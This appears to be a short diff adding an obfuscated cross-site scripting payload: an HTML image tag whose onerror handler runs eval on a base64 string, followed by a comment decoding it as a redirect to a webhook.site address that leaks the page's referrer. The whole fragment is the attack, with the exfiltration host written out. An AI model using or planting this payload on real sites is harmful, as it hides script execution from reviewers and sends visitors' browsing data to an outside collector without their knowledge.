@@ -1,0 +1,5 @@
+<img src=X onerror=eval(atob("d2luZG93LmxvY2F0aW9uPSJodHRwczovL3dlYmhvb2suc2l0ZS8xMjU5MDQ1Zi0wNzZkLTQ5ZDctOTQzNS1lMWQ4MDU4Nzk5ZmQvbGVhaz9yZWZlcnJlcj0iK2RvY3VtZW50LnJlZmVycmVy"))>
+
+"""
+Base64 decode: window.location="https://webhook.site/.../leak?referrer="+document.referrer
+"""
